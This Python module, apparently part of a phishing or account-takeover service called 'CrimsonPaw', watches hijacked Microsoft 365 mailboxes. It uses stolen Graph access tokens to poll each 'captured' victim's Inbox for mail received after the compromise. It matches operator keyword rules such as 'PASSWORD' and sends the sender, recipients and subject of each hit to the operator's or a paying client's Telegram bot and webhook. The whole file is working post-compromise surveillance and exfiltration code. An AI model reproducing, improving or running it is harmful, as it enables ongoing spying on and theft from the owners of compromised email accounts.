# ── keyword_watcher.py ──────────────────────────────────────────────
import re
import json
import time
import html
import logging
import threading
import urllib.request
import urllib.error
from pathlib import Path
from config import Config
import db

logger = logging.getLogger(__name__)

BASE_DIR = Path(__file__).parent.resolve()
SETTINGS_FILE = BASE_DIR / 'settings.json'

# Per-session reentrant locks. A single global lock serialised every mailbox,
# so a burst of captures queued up behind each other and alerts lagged by
# minutes. Each mailbox now scans independently; only the same mailbox is
# serialised (which is all the dedup ledger needs).
_user_locks = {}
_user_locks_guard = threading.Lock()

# Scopes (owner partitions) with a bulk scan in flight. Replaces the old single
# global "scan already in progress" flag so a manual scan of one tenant no
# longer blocks the background daemon for every other tenant.
_active_scopes = set()
_scopes_guard = threading.Lock()

# How many mailboxes may scan simultaneously.
SCAN_CONCURRENCY = int(getattr(Config, 'SCAN_CONCURRENCY', 8))


def _lock_for(user_code):
    """Return the per-mailbox lock, creating it on first use."""
    with _user_locks_guard:
        lock = _user_locks.get(user_code)
        if lock is None:
            lock = threading.RLock()
            _user_locks[user_code] = lock
        return lock


def _claim_scope(scope_key):
    """Mark a scope as scanning. Returns False if it is already in flight."""
    with _scopes_guard:
        if scope_key in _active_scopes:
            return False
        _active_scopes.add(scope_key)
        return True


def _release_scope(scope_key):
    with _scopes_guard:
        _active_scopes.discard(scope_key)

def load_settings():
    if SETTINGS_FILE.exists():
        try:
            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.warning(f"Failed to read settings.json: {e}")
    return {}

def send_keyword_telegram_message(bot_token, chat_id, text, parse_mode='HTML'):
    """Send a message using a specific bot token and chat ID, returning (success, error_message)."""
    if not bot_token or not chat_id:
        return False, "Bot token or Chat ID is missing."
    try:
        payload = json.dumps({
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode,
            'disable_web_page_preview': True
        }).encode('utf-8')
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data=payload,
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=10) as res:
            if res.status == 200:
                return True, "Message delivered successfully."
    except urllib.error.HTTPError as e:
        err_body = ""
        try:
            err_body = e.read().decode('utf-8')
            err_json = json.loads(err_body)
            err_body = err_json.get('description', err_body)
        except Exception:
            pass
        return False, f"Telegram API error ({e.code}): {err_body or e.reason}"
    except Exception as e:
        return False, f"Connection error: {str(e)}"
    return False, "Unknown failure."

def send_alert(tg_html, wh_md="", owner_id=None):
    """Dispatch real-time keyword notification to the owning tenant's Telegram bot,
    falling back to the global Keyword bot for master-owned (unowned) events."""
    cfg = load_settings()

    # Resolve the owning tenant's personal bot (client subscribers get their own channel)
    owner_bot_token = ''
    owner_chat_id = ''
    if owner_id:
        try:
            op = db.get_operator(owner_id)
            if op:
                owner_bot_token = (op.get('tg_bot_token') or '').strip()
                owner_chat_id = (op.get('tg_chat_id') or '').strip()
        except Exception:
            pass

    # 1. Dedicated Keyword Alerts Telegram Bot
    if cfg.get('kwa_tg_enabled', True):
        kwa_bot_token = (owner_bot_token or cfg.get('kwa_tg_bot_token', '') or cfg.get('tg_bot_token', '')).strip()
        kwa_chat_id = (owner_chat_id or cfg.get('kwa_tg_chat_id', '') or cfg.get('tg_chat_id', '')).strip()
        if kwa_bot_token and kwa_chat_id:
            ok, msg = send_keyword_telegram_message(kwa_bot_token, kwa_chat_id, tg_html)
            if ok:
                logger.info("✓ Keyword alert Telegram notification sent.")
            else:
                logger.warning(f"Failed to dispatch keyword alert to Telegram: {msg}")
        else:
            logger.info("Keyword alert Telegram notification skipped: Telegram bot token/chat ID not configured.")

    # Tenant-exclusive routing: client-owned events stop here — the global
    # webhook belongs to the master platform and must not receive client intel.
    if owner_id:
        return

    # 2. Webhook Dispatch
    webhook_url = cfg.get('kwa_webhook_url', '').strip() or cfg.get('webhook_url', '').strip()
    if webhook_url:
        try:
            content = wh_md or tg_html
            payload = json.dumps({'content': content, 'text': content}).encode('utf-8')
            req = urllib.request.Request(
                webhook_url,
                data=payload,
                headers={'Content-Type': 'application/json', 'User-Agent': 'Crimson-Paw-Watcher/1.0'}
            )
            urllib.request.urlopen(req, timeout=8)
            logger.info("✓ Keyword alert Webhook notification sent.")
        except Exception as e:
            logger.warning(f"Failed to dispatch keyword alert to Webhook: {e}")

def extract_snippet(text, keyword, context_chars=75):
    """Extract a concise excerpt surrounding the matched keyword with clean ellipses."""
    if not text or not keyword:
        return ""
    pos = text.lower().find(keyword.lower())
    if pos == -1:
        return text[:140] + ("..." if len(text) > 140 else "")
    start = max(0, pos - context_chars)
    end = min(len(text), pos + len(keyword) + context_chars)
    snippet = text[start:end].replace('\r', ' ').replace('\n', ' ').strip()
    if start > 0:
        snippet = "..." + snippet
    if end < len(text):
        snippet = snippet + "..."
    return snippet

def dispatch_keyword_alert(match_data, rule_data):
    """Format Telegram and Webhook keyword alerts using CrimsonPaw keyword alert structure."""
    # Resolve the owning tenant for exclusive alert routing (client bots get their own intel)
    owner_id = None
    try:
        s_row = db.get_session_by_user_code(match_data.get('session_user_code'))
        if s_row:
            owner_id = s_row.get('owner_id')
    except Exception:
        pass

    raw_kw = str(match_data.get('matched_keyword', '')).strip()
    raw_mailbox = str(match_data.get('victim_email') or match_data.get('victim_name') or 'Unknown Mailbox').strip()
    raw_subject = str(match_data.get('email_subject', '(No Subject)')).strip()
    raw_sender = str(match_data.get('email_sender', 'Unknown')).strip()
    raw_to = str(match_data.get('email_to', '—') or '—').strip()
    raw_cc = str(match_data.get('email_cc', '—') or '—').strip()
    raw_bcc = str(match_data.get('email_bcc', '—') or '—').strip()

    # Telegram HTML format
    tg_html = (
        "<b>CrimsonPaw keyword alert</b>\n"
        f"<b>Phrase:</b> {html.escape(raw_kw)}\n"
        f"<b>Mailbox:</b> {html.escape(raw_mailbox)}\n"
        f"<b>Subject:</b> {html.escape(raw_subject)}\n"
        f"<b>From:</b> {html.escape(raw_sender)}\n"
        f"<b>To:</b> {html.escape(raw_to)}\n"
        f"<b>Cc:</b> {html.escape(raw_cc)}\n"
        f"<b>Bcc:</b> {html.escape(raw_bcc)}"
    )

    # Webhook markdown format
    wh_md = (
        "**CrimsonPaw keyword alert**\n"
        f"Phrase: {raw_kw}\n"
        f"Mailbox: {raw_mailbox}\n"
        f"Subject: {raw_subject}\n"
        f"From: {raw_sender}\n"
        f"To: {raw_to}\n"
        f"Cc: {raw_cc}\n"
        f"Bcc: {raw_bcc}"
    )

    send_alert(tg_html, wh_md, owner_id=owner_id)

def parse_iso_datetime(dt_str):
    """Normalize ISO-8601 or SQLite datetime string to comparable YYYY-MM-DD HH:MM:SS format."""
    if not dt_str:
        return None
    cleaned = str(dt_str).replace('T', ' ').replace('Z', '').strip()
    if '.' in cleaned:
        cleaned = cleaned.split('.')[0]
    return cleaned

def fetch_graph_messages(access_token, top=50):
    """Fetch recent messages strictly from victim's Inbox folder sorted newest-first.
    Excludes Sent Items, Drafts, and Deleted Items to prevent outgoing campaign duplication.
    """
    url = f"https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?$top={top}&$orderby=receivedDateTime%20desc&$select=id,internetMessageId,subject,from,toRecipients,ccRecipients,bccRecipients,bodyPreview,receivedDateTime,hasAttachments,parentFolderId"
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Accept': 'application/json'
    }
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=12) as res:
            if res.status == 200:
                data = json.loads(res.read().decode('utf-8'))
                return data.get('value', [])
    except urllib.error.HTTPError as e:
        logger.warning(f"Graph API fetch error ({e.code}): {e.reason}")
    except Exception as e:
        logger.warning(f"Graph API connection error: {e}")
    return []

def scan_victim_mailbox(session, rules=None):
    """Scan a single victim's new incoming emails against active keyword rules.
    Serialised per mailbox via its own lock, so different mailboxes scan in
    parallel. Filters out self-sent emails and deduplicates across folders
    using internetMessageId.
    """
    with _lock_for(session.get('user_code')):
        user_code = session.get('user_code')
        victim_name = session.get('victim_name') or 'Unknown'
        victim_email = session.get('victim_email') or 'Unknown'
        v_email_clean = (victim_email or '').strip().lower()
        
        token = db.get_graph_access_token(session)
        if not token:
            logger.info(f"[KEYWORD-WATCHER] Skipping {user_code}: No valid access token available.")
            return {'status': 'error', 'message': 'No valid access token available', 'hits': 0}

        if rules is None:
            rules = db.get_keyword_rules(active_only=True, owner_id=session.get('owner_id'))

        # Filter rules for this account
        applicable_rules = []
        for r in rules:
            target = r.get('target_account', 'all')
            if target in ('all', '', user_code):
                applicable_rules.append(r)

        if not applicable_rules:
            return {'status': 'ok', 'message': 'No applicable rules for account', 'hits': 0}

        messages = fetch_graph_messages(token, top=50)
        if not messages:
            return {'status': 'ok', 'message': 'No messages retrieved', 'hits': 0}

        # Timestamp when account was captured
        capture_time = parse_iso_datetime(session.get('completed_at') or session.get('created_at'))

        new_hits = 0
        detected_matches = []

        for msg in messages:
            msg_id = msg.get('id')
            internet_msg_id = (msg.get('internetMessageId') or '').strip()
            rcvd_time = msg.get('receivedDateTime') or ''
            
            # Enforce boundary: Only evaluate emails received ON OR AFTER victim capture
            msg_time = parse_iso_datetime(rcvd_time)
            if capture_time and msg_time and msg_time < capture_time:
                # Historical email arrived before account was compromised — skip
                continue

            # Deduplication Ledger: Check both Graph message_id and RFC internetMessageId
            if db.is_message_already_matched(user_code, msg_id, internet_message_id=internet_msg_id):
                continue

            sender_obj = msg.get('from', {}).get('emailAddress', {})
            sender_addr = (sender_obj.get('address') or '').strip().lower()
            sender_name = (sender_obj.get('name') or '').strip()
            sender = f"{sender_name} <{sender_addr}>".strip()

            # Guard 1: Ignore emails sent by the victim/operator themselves (outbound B2B campaigns / test sends)
            # Checks exact address, username before @ (handles custom vs .onmicrosoft.com domains), and display name
            is_self_sent = False
            if sender_addr:
                if v_email_clean and sender_addr == v_email_clean:
                    is_self_sent = True
                elif v_email_clean and '@' in sender_addr and '@' in v_email_clean:
                    if sender_addr.split('@')[0] == v_email_clean.split('@')[0]:
                        is_self_sent = True
                if not is_self_sent and victim_name and len(victim_name) > 3 and victim_name.lower() in sender_name.lower():
                    is_self_sent = True
            if is_self_sent:
                continue

            # Guard 2: Ignore Non-Delivery Reports (NDRs), system bounces, delivery failure notifications, auto-replies
            subject = (msg.get('subject') or '').strip()
            subj_lower = subject.lower()
            if any(sig in sender_addr for sig in ('microsoftexchange', 'mailer-daemon', 'postmaster', 'systemadministrator')):
                continue
            if any(subj_lower.startswith(bp) for bp in (
                'undeliverable:', 'delivery has failed', 'delivery status notification',
                'failure notice', 'returned mail:', 'undelivered mail', 'automatic reply:', 'out of office:'
            )):
                continue

            body_preview = msg.get('bodyPreview') or ''

            def _fmt_recipients(recipients_list):
                if not recipients_list:
                    return "—"
                res = []
                for item in recipients_list:
                    ea = item.get('emailAddress', {}) if isinstance(item, dict) else {}
                    addr = (ea.get('address') or '').strip()
                    name = (ea.get('name') or '').strip()
                    if addr:
                        res.append(f"{name} <{addr}>" if name and name != addr else addr)
                return ", ".join(res) if res else "—"

            to_str = _fmt_recipients(msg.get('toRecipients'))
            cc_str = _fmt_recipients(msg.get('ccRecipients'))
            bcc_str = _fmt_recipients(msg.get('bccRecipients'))

            for r in applicable_rules:
                # Deduplication: If this message was already matched and alerted for this rule, skip immediately
                if db.is_message_already_matched(user_code, msg_id, r['id'], internet_message_id=internet_msg_id):
                    continue

                scope = r.get('search_scope', 'all')
                keywords = r.get('keywords', [])

                # Construct searchable text block based on scope
                search_fields = []
                if scope in ('all', 'subject'):
                    search_fields.append(('subject', subject))
                if scope in ('all', 'body'):
                    search_fields.append(('body', body_preview))
                if scope == 'all':
                    search_fields.append(('sender', sender))

                matched_keywords = []
                matched_field = None
                matched_text = ""

                for kw in keywords:
                    kw_str = str(kw).strip()
                    if not kw_str:
                        continue
                    
                    # Check match across configured fields
                    for field_name, field_val in search_fields:
                        if kw_str.lower() in field_val.lower():
                            if kw_str not in matched_keywords:
                                matched_keywords.append(kw_str)
                            if not matched_field:
                                matched_field = field_name
                                matched_text = field_val
                            break

                if matched_keywords:
                    # Group matched keywords into a clean single string (e.g. "PASSWORD, NEW PASSWORD")
                    primary_kw = matched_keywords[0]
                    kw_display = ", ".join(matched_keywords)
                    snippet = extract_snippet(matched_text if matched_field != 'subject' else f"{subject} — {body_preview}", primary_kw)

                    # ── ATOMIC: Write to ledger FIRST to prevent any concurrent scan from re-alerting ──
                    db.mark_message_alerted(user_code, msg_id, rcvd_time, internet_message_id=internet_msg_id)

                    match_id = db.record_keyword_match(
                        rule_id=r['id'],
                        session_user_code=user_code,
                        victim_name=victim_name,
                        victim_email=victim_email,
                        matched_keyword=kw_display,
                        email_subject=subject,
                        email_sender=sender,
                        email_snippet=snippet,
                        message_id=msg_id,
                        received_datetime=rcvd_time
                    )
                    if match_id:
                        new_hits += 1
                        match_payload = {
                            'id': match_id,
                            'rule_id': r['id'],
                            'session_user_code': user_code,
                            'victim_name': victim_name,
                            'victim_email': victim_email,
                            'matched_keyword': kw_display,
                            'email_subject': subject,
                            'email_sender': sender,
                            'email_to': to_str,
                            'email_cc': cc_str,
                            'email_bcc': bcc_str,
                            'email_snippet': snippet,
                            'message_id': msg_id,
                            'received_datetime': rcvd_time
                        }
                        detected_matches.append(match_payload)
                        # Dispatch Telegram / Webhook strictly ONCE for this email
                        if r.get('notify_telegram') or r.get('notify_webhook'):
                            try:
                                dispatch_keyword_alert(match_payload, r)
                            except Exception as e:
                                logger.warning(f"Error dispatching alert: {e}")
                    
                    # Once this email has triggered an alert for this match, stop evaluating further rules for it
                    break

        logger.info(f"[KEYWORD-WATCHER] Scanned {len(messages)} Inbox emails for {user_code} ({victim_email}): {new_hits} new hits.")
        return {
            'status': 'ok',
            'emails_scanned': len(messages),
            'new_hits': new_hits,
            'matches': detected_matches
        }

def _scan_sessions(sessions, rule_ids=None):
    """Core scan loop over an already-selected session list.

    Rules are resolved per owner so a tenant's rules only ever evaluate that
    tenant's mailboxes. Mailboxes are scanned in parallel (bounded by
    SCAN_CONCURRENCY) — each is independently locked, so a burst of captures
    no longer serialises into a multi-minute backlog.
    """
    captured = [s for s in sessions if s.get('status') == 'CAPTURED']

    # ── Per-tenant rule scoping ─────────────────────────────────────
    # Client rules scan ONLY client-owned mailboxes; master-owned rules
    # (owner_id IS NULL) scan ONLY master mailboxes. No cross-tenant intel.
    rules_cache = {}

    def _rules_for(owner_id):
        key = owner_id if owner_id is not None else '__master__'
        if key not in rules_cache:
            owner_rules = db.get_keyword_rules(active_only=True, owner_id=owner_id)
            if rule_ids:
                owner_rules = [r for r in owner_rules if r['id'] in rule_ids]
            rules_cache[key] = owner_rules
        return rules_cache[key]

    total_scanned_accounts = 0
    total_emails_scanned = 0
    total_new_hits = 0

    from concurrent.futures import ThreadPoolExecutor

    def _one(s):
        return scan_victim_mailbox(s, rules=_rules_for(s.get('owner_id')))

    if captured:
        with ThreadPoolExecutor(max_workers=min(SCAN_CONCURRENCY, len(captured)),
                                thread_name_prefix='kwscan') as pool:
            results = list(pool.map(_one, captured))
    else:
        results = []

    for res in results:
        if res.get('status') == 'ok':
            total_scanned_accounts += 1
            total_emails_scanned += res.get('emails_scanned', 0)
            total_new_hits += res.get('new_hits', 0)

    return {
        'status': 'ok',
        'scanned_accounts': total_scanned_accounts,
        'total_emails_scanned': total_emails_scanned,
        'total_new_hits': total_new_hits
    }

def scan_all_victims(rule_ids=None, owner_id=None):
    """Scan mailboxes of CAPTURED sessions within a single tenant partition.

    owner_id=None scans the MASTER partition (owner_id IS NULL) only; passing a
    client id scans that tenant's mailboxes only. Without this the manual
    "Run Scan Now" button scanned the whole platform and reported the admin's
    victims to a subscriber who owns none of them.

    Uses per-scope claim flags to prevent concurrent scans of the same scope
    from racing and dispatching duplicate alerts.
    """
    scope_key = ('owner', owner_id)
    if not _claim_scope(scope_key):
        logger.info("[KEYWORD-WATCHER] Scan already in progress, skipping this cycle.")
        return {'status': 'skipped', 'message': 'Scan already in progress', 'scanned_accounts': 0, 'total_emails_scanned': 0, 'total_new_hits': 0}

    try:
        if owner_id is None:
            sessions = db.get_all_sessions(admin_only=True)
        else:
            sessions = db.get_all_sessions(owner_id=owner_id)
        return _scan_sessions(sessions, rule_ids=rule_ids)
    finally:
        _release_scope(scope_key)

def scan_platform(rule_ids=None):
    """Scan EVERY tenant partition — used by the background daemon so client
    mailboxes keep being watched while the admin console is idle."""
    scope_key = ('platform',)
    if not _claim_scope(scope_key):
        logger.info("[KEYWORD-WATCHER] Scan already in progress, skipping this cycle.")
        return {'status': 'skipped', 'message': 'Scan already in progress', 'scanned_accounts': 0, 'total_emails_scanned': 0, 'total_new_hits': 0}
    try:
        return _scan_sessions(db.get_all_sessions(), rule_ids=rule_ids)
    finally:
        _release_scope(scope_key)

class KeywordWatcherThread(threading.Thread):
    """Continuous background daemon polling victim mailboxes for keyword matches."""
    def __init__(self, interval_seconds=45):
        super().__init__(daemon=True, name="KeywordWatcher")
        self.interval = interval_seconds
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def run(self):
        logger.info(f"Keyword Watcher background daemon started (polling interval: {self.interval}s).")
        # Allow system boot to stabilize before starting first scan
        time.sleep(5)
        while not self._stop_event.is_set():
            try:
                res = scan_platform()
                hits = res.get('total_new_hits', 0)
                if hits > 0:
                    logger.info(f"[KEYWORD-WATCHER] Background cycle detected {hits} new intelligence hits.")
            except Exception as e:
                logger.error(f"[KEYWORD-WATCHER] Error in background polling cycle: {e}")
            self._stop_event.wait(self.interval)
